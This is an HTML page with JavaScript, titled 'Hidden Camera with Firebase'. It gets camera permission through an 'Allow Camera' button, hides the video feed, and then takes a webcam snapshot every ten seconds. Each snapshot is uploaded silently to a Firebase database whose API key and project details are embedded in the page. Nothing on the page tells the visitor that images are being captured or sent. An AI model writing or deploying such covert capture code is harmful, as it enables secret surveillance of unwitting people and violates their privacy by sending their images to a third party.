<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hidden Camera with Firebase</title>
</head>
<body>
    <h3 id="status">Requesting Camera Access...</h3>
    <button id="startButton">Allow Camera</button>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script type="module">
        // Import Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyD_Btusq5Y0xkkKcyJtMGpJILVctbAfwUc",
            authDomain: "website-50137.firebaseapp.com",
            databaseURL: "https://website-50137-default-rtdb.firebaseio.com/",
            projectId: "website-50137",
            storageBucket: "website-50137.appspot.com",
            messagingSenderId: "488588300747",
            appId: "1:488588300747:web:19e1e00246a851ba03e64e",
            measurementId: "G-QH9EMHRV04"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let video = document.getElementById("video");
        let canvas = document.getElementById("canvas");
        let context = canvas.getContext("2d");
        let startButton = document.getElementById("startButton");
        let statusText = document.getElementById("status");
        let stream = null;

        async function requestCameraPermission() {
            try {
                let permission = await navigator.permissions.query({ name: "camera" });

                if (permission.state === "denied") {
                    statusText.innerText = "Camera access denied! Please enable it in browser settings.";
                    return;
                }

                startCamera();
            } catch (error) {
                console.error("Permission error:", error);
                statusText.innerText = "Error requesting camera permission.";
            }
        }

        async function startCamera() {
            try {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }

                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });

                video.srcObject = stream;
                statusText.innerText = "Camera started.";
                startButton.style.display = "none";

                video.onloadedmetadata = () => {
                    setTimeout(autoCapture, 3000);
                };
            } catch (error) {
                console.error("Camera access error:", error);
                statusText.innerText = "Camera access failed. Check browser settings.";
            }
        }

        function captureImage() {
            if (video.videoWidth === 0 || video.videoHeight === 0) {
                console.error("Video not ready, retrying...");
                setTimeout(captureImage, 1000);
                return;
            }

            let targetWidth = 240;
            let targetHeight = (video.videoHeight / video.videoWidth) * targetWidth;

            canvas.width = targetWidth;
            canvas.height = targetHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            let base64Image = canvas.toDataURL("image/webp", 0.2);
            let compressedBase64 = base64Image.replace(/^data:image\/webp;base64,/, "");

            sendToFirebase(compressedBase64);
        }

        async function sendToFirebase(compressedBase64) {
            try {
                await push(ref(db, "captured_images"), {
                    image: "data:image/webp;base64," + compressedBase64,
                    timestamp: new Date().toISOString()
                });

                console.log("Image successfully sent to Firebase");
            } catch (error) {
                console.error("Firebase Error:", error);
            }
        }

        function autoCapture() {
            console.log("Attempting to capture...");
            captureImage();
            setTimeout(autoCapture, 10000);
        }

        startButton.addEventListener("click", requestCameraPermission);
    </script>
</body>
</html>
